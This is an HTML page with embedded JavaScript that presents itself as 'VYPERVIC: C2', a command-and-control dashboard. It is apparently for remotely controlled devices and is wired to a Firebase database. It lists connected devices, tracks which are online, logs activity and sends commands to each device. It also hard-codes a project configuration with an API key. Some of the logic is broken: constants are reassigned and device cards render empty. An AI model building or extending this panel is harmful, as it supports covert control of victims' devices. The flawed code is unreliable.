<!DOCTYPE html>
<html><head><title>VYPERVIC: C2</title><script type="module">
import{initializeApp}from'https://www.gstatic.com/firebasejs/10.13.1/firebase-app.js';
import{getDatabase,ref,onValue,set}from'https://www.gstatic.com/firebasejs/10.13.1/firebase-database.js';
const firebaseConfig={apiKey:"AIzaSyCt1-F7MPDTNX44njmu-oOxgVy2OQqOM_Q",authDomain:"vypervic-c2.firebaseapp.com",projectId:"vypervic-c2",storageBucket:"vypervic-c2.firebasestorage.app",messagingSenderId:"86010863857",appId:"1:86010863857:android:60a7aecf3fa7bbca348950"};
const app=initializeApp(firebaseConfig);window.db=getDatabase(app);</script>
<style>*{margin:0;padding:0;box-sizing:border-box;}body{background:linear-gradient(45deg,#000,#001100);color:#00ff00;font-family:'Courier New',monospace;min-height:100vh;padding:20px;}
h1{text-align:center;color:#ff0000;font-size:4rem;text-shadow:0 0 30px #ff0000;margin-bottom:30px;animation:glow 2s infinite alternate;}
@keyframes glow{from{text-shadow:0 0 20px #ff0000;}to{text-shadow:0 0 40px #ff0000,0 0 60px #ff0000;}}
.container{max-width:1400px;margin:0 auto;}
.status-bar{background:#111;padding:15px;border:2px solid #00ff00;margin-bottom:20px;border-radius:10px;text-align:center;font-size:1.2rem;}
.device-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:20px;margin-bottom:20px;}
.device{background:rgba(17,17,17,0.9);padding:25px;border:2px solid #00ff00;border-radius:15px;box-shadow:0 0 20px rgba(0,255,0,0.3);}
.device h3{color:#ffff00;margin-bottom:20px;text-align:center;font-size:1.4rem;}
.btn-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;}
.btn{background:#222;color:#00ff00;border:2px solid #00ff00;padding:12px 8px;cursor:pointer;font-family:inherit;font-size:0.9rem;border-radius:8px;transition:all .3s;text-transform:uppercase;font-weight:bold;}
.btn:hover{background:#00ff00!important;color:#000!important;box-shadow:0 0 15px #00ff00;transform:scale(1.05);}
.btn:active{transform:scale(.98);}
.logs{background:#000;color:#0f0;height:250px;overflow-y:auto;font-size:11px;border:2px solid #333;padding:15px;margin-top:20px;border-radius:10px;white-space:pre-wrap;font-family:monospace;}
.online{border-color:#00ff00!important;box-shadow:0 0 20px #00ff00!important;}
.offline{border-color:#666;opacity:.5;}</style></head>
<body><div class="container"><h1>🔥 VYPERVIC: C2 🔥</h1><div class="status-bar" id="status">Status: Waiting... | Online: 0</div><div class="device-grid" id="devices"></div><div class="logs" id="logs">[SYSTEM] VYPERVIC C2 Initialized</div></div>
<script type="module">
import{ref,onValue,set}from'https://www.gstatic.com/firebasejs/10.13.1/firebase-database.js';
const db=window.db,devicesRef=ref(db,'devices');
function addLog(m){const t=new Date().toLocaleString(),e=`[${t}] ${m}`,s=document.getElementById('logs');s.innerHTML+=`<div>${e}</div>`;s.scrollTop=s.scrollHeight;set(ref(db,`logs/${Date.now()}`),e);}
onValue(devicesRef,s=>{const e=s.val(),i=document.getElementById('devices'),a='',n=0;if(e){Object.entries(e).forEach(([e,s])=>{const i=s.lastSeen&&(Date.now()-s.lastSeen<3e4);i&&n++;i=document.getElementById('devices');i.innerHTML=a;document.getElementById('status').innerHTML=`Status: ${n} device${n!==1?'s':''} online | Total: ${Object.keys(e||{}).length}`;addLog(`${n} devices online`);});}else i.innerHTML='<div class="device offline"><h3>No devices</h3></div>';});window.sendCmd=(e,i)=>{set(ref(db,`devices/${e}/commands/${i}`),Date.now()).then(()=>addLog(`✅ "${i}" → ${e}`)).catch(e=>addLog(`❌ ${e.message}`));};
</script></body></html>
